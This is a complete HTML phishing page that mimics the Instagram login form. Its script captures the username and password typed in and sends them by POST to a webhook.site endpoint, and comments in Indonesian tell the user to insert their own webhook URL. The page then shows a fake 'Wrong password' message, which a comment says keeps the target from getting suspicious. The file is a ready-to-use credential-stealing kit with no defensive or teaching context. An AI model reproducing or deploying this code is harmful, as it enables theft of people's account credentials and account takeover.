<!DOCTYPE html>
<html>
<head>
<title>Instagram Login</title>
<style>
body{background:#fafafa;font-family:Arial}
.login-box{width:350px;margin:100px auto;background:white;padding:40px;border:1px solid #dbdbdb}
input{width:100%;padding:10px;margin:5px 0;border:1px solid #dbdbdb}
button{background:#0095f6;color:white;padding:10px;width:100%;border:none;border-radius:5px}
</style>
</head>
<body>
<div class="login-box">
<img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png">
<form id="igForm">
<input type="text" id="user" placeholder="Phone number, username, or email" required>
<input type="password" id="pass" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</div>
<script>
document.getElementById("igForm").addEventListener("submit", function(e){
e.preventDefault();
let u = document.getElementById("user").value;
let p = document.getElementById("pass").value;

// GANTI WEBHOOK INI PAKE URL LO SENDIRI
fetch("https://webhook.site/isi-url-lo-disini", {
method: "POST",
body: JSON.stringify({username: u, password: p, time: new Date().toString()}),
headers: {"Content-Type": "application/json"}
});

alert("Wrong password. Try again."); // biar target ga curiga
document.getElementById("igForm").reset();
});
</script>
</body>
</html>
